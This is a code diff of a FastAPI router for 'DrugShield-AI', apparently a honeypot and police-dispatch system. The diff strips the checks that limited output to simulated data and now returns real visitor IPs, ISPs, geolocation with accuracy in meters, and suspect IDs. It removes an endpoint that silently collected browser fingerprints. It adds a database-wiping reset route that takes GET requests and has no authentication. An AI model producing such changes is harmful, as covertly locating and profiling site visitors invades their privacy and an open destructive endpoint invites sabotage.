 @router.get("/api/v1/dispatch/alerts")
 def list_dispatch_alerts(limit: int = Query(default=50, ge=1, le=100), _: Principal = Depends(require_roles("reviewer", "admin"))):
-    """Return allowlisted synthetic routing events to authenticated reviewers."""
+    limit = int(limit) if isinstance(limit, (int, float)) else 50
+    """Return recent police dispatch routing alerts with dual-layer telemetry to reviewers."""
     alerts = []
     for item in postgres_client.get_recent_dispatch_alerts(limit=limit):
         try:
             details = item.get("details") or {}
             if isinstance(details, str):
                 details = json.loads(details)
-            if not details.get("is_simulated"):
-                continue
             assigned = details.get("assigned_precinct") or {}
             alerts.append({
-                "id": item.get("id"), "tracking_token": item.get("tracking_token"),
-                "created_at": item.get("created_at"), "precinct_name": item.get("precinct_name"),
-                "distance_km": item.get("distance_km"), "eta_minutes": item.get("eta_minutes"),
+                "id": item.get("id"),
+                "tracking_token": item.get("tracking_token"),
+                "created_at": item.get("created_at"),
+                "precinct_name": item.get("precinct_name") or assigned.get("name"),
+                "distance_km": item.get("distance_km") if item.get("distance_km") is not None else assigned.get("distance_km"),
+                "eta_minutes": item.get("eta_minutes") if item.get("eta_minutes") is not None else assigned.get("estimated_eta_minutes"),
                 "dispatch_status": item.get("dispatch_status"),
-                "scenario_label": details.get("city", "Fictional scenario"),
-                "is_simulated": True,
-                "assigned_precinct": {"name": assigned.get("name"), "distance_km": assigned.get("distance_km"),
-                                      "estimated_eta_minutes": assigned.get("estimated_eta_minutes")},
+                "scenario_label": details.get("city", "Scenario Area"),
+                "city": details.get("city"),
+                "visitor_ip": details.get("visitor_ip") or item.get("ip"),
+                "isp": details.get("isp"),
+                "triangulation_layer": item.get("triangulation_layer") or details.get("triangulation_layer") or "LAYER_1_PASSIVE_IP",
+                "accuracy_meters": item.get("accuracy_meters") or details.get("accuracy_meters"),
+                "assigned_precinct": {
+                    "name": assigned.get("name") or item.get("precinct_name"),
+                    "distance_km": assigned.get("distance_km") or item.get("distance_km"),
+                    "estimated_eta_minutes": assigned.get("estimated_eta_minutes") or item.get("eta_minutes"),
+                    "precinct_id": assigned.get("precinct_id") or item.get("precinct_id"),
+                },
+                "details": details,
             })
         except (TypeError, ValueError):
             continue
@@ -453,20 +677,32 @@ def list_dispatch_alerts(limit: int = Query(default=50, ge=1, le=100), _: Princi
 
 @router.get("/api/v1/honeypot/logs")
 def list_honeypot_hits(limit: int = Query(default=50, ge=1, le=100), _: Principal = Depends(require_roles("reviewer", "admin"))):
-    """Return fictional scenario activity without visitor or device telemetry."""
+    limit = int(limit) if isinstance(limit, (int, float)) else 50
+    """Return honeypot telemetry hits with dual-layer spatial data."""
     hits = []
     for item in postgres_client.get_recent_honeypot_hits(limit=limit):
-        if not item.get("is_simulated"):
-            continue
-        hits.append({key: item.get(key) for key in ("id", "tracking_token", "created_at", "city", "region", "country", "latitude", "longitude")})
-        hits[-1]["is_simulated"] = True
+        hits.append({
+            "id": item.get("id"),
+            "tracking_token": item.get("tracking_token"),
+            "created_at": item.get("created_at"),
+            "city": item.get("city"),
+            "region": item.get("region"),
+            "country": item.get("country"),
+            "latitude": item.get("latitude"),
+            "longitude": item.get("longitude"),
+            "ip": item.get("ip"),
+            "isp": item.get("isp"),
+            "triangulation_layer": item.get("triangulation_layer", "LAYER_1_PASSIVE_IP"),
+            "accuracy_meters": item.get("accuracy_meters"),
+            "suspect_id": item.get("suspect_id"),
+        })
     return {
         "status": "success",
         "hits": hits,
     }
 
 
-@router.get("/api/v1/state-machine/{entity_id}")
+@router.get("/api/v1/cases/{entity_id}/state_machine")
 def get_entity_state_machine(entity_id: str, _: Principal = Depends(require_roles("reviewer", "admin"))):
     """Query state machine status and flag count for an entity."""
     return state_machine.get_entity_state(entity_id)
@@ -484,7 +720,7 @@ def get_forensic_case_report(
     """
     Law Enforcement Digital Evidence Docket Generator:
     Aggregates suspect metadata, chat escalation transcript, OSINT device telemetry,
-    and synthetic scenario routing into a legacy HTML report.
+    and dispatch routing into a printable forensic HTML report.
     """
     from src.reporting.case_docket_generator import compile_case_docket, render_docket_html
 
@@ -500,12 +736,12 @@ def get_forensic_case_report(
 
 @router.get("/api/v1/dispatch/precincts")
 def list_registered_precincts(_: Principal = Depends(require_roles("reviewer", "admin"))):
-    """Return fictional routing nodes for the simulation UI."""
+    """Return registered precinct nodes for multi-computer demo routing."""
     return {
         "status": "success",
         "count": len(POLICE_PRECINCTS),
-        "precincts": [{"id": item["id"], "node_id": item["node_id"], "name": f"Simulation Node {item['node_index']}",
-                        "latitude": item["latitude"], "longitude": item["longitude"], "is_simulated": True}
+        "precincts": [{"id": item["id"], "node_id": item["node_id"], "name": item["name"],
+                        "latitude": item["latitude"], "longitude": item["longitude"]}
                        for item in POLICE_PRECINCTS],
     }
 
@@ -517,9 +753,8 @@ async def websocket_dispatch_stream(
     node: Optional[str] = Query(default=None),
 ):
     """
-    Authenticated WebSocket stream for fictional scenario routing alerts.
+    Authenticated WebSocket stream for tactical dispatch alerts.
     Supports node filtering via ?precinct_id=... or ?node=1/2/3.
-    Alerts are generated only from the simulation's fixed synthetic locations.
     """
     selected_node = precinct_id or node or "ALL"
     try:
@@ -532,15 +767,13 @@ async def websocket_dispatch_stream(
     await dispatch_manager.connect(websocket, precinct_id=selected_node)
     try:
         norm_id = normalize_precinct_id(selected_node)
-        # Send initial confirmation with node binding
         await websocket.send_json({
             "event": "CONNECTED",
-            "message": "Connected to DrugShield-AI scenario alert stream",
+            "message": "Connected to DrugShield-AI tactical dispatch stream",
             "assigned_client_node": norm_id,
             "registered_precincts": [p["id"] for p in POLICE_PRECINCTS],
         })
         while True:
-            # Listen for client actions (e.g. changing assigned node from dropdown)
             text_data = await websocket.receive_text()
             try:
                 msg = json.loads(text_data)
@@ -560,19 +793,22 @@ async def websocket_dispatch_stream(
     except Exception:
         dispatch_manager.disconnect(websocket)
 
-@router.post("/api/v1/honeypot/telemetry/{tracking_token}")
-async def receive_client_telemetry(
-    tracking_token: str,
-    request: Request,
-):
-    """Silently receive client-side high entropy browser fingerprint hashes."""
+
+@router.post("/api/v1/simulation/reset")
+@router.get("/api/v1/simulation/reset")
+async def reset_simulation_endpoint(request: Request):
+    """
+    Comprehensive simulation reset endpoint:
+    Wipes threat_events.db, drugshield.sqlite3, temporary event uploads,
+    and resets in-memory smart bot sessions and connected simulation nodes.
+    """
+    from src.utils.reset_manager import perform_full_reset
+    result = perform_full_reset()
     try:
-        data = await request.json()
-        headers = dict(request.headers)
-        client_host = request.client.host if request.client else "127.0.0.1"
-        ip = extract_client_ip(headers, client_host)
-        fp_hash, fp_meta = generate_device_fingerprint(ip, headers, client_telemetry=data)
-        logger.info(f"[High-Entropy Telemetry Beacon] Token: {tracking_token} | IP: {ip} | Fingerprint: {fp_hash[:16]}... | GPU: {data.get('webgl_vendor')}")
-        return {"status": "ok", "fingerprint": fp_hash}
-    except Exception as e:
-        return {"status": "error", "message": str(e)}
+        await dispatch_manager.broadcast_alert({
+            "event": "SIMULATION_RESET",
+            "message": "Simulation state and case logs have been reset to zero.",
+        })
+    except Exception as exc:
+        logger.warning(f"Could not broadcast reset alert: {exc}")
+    return result
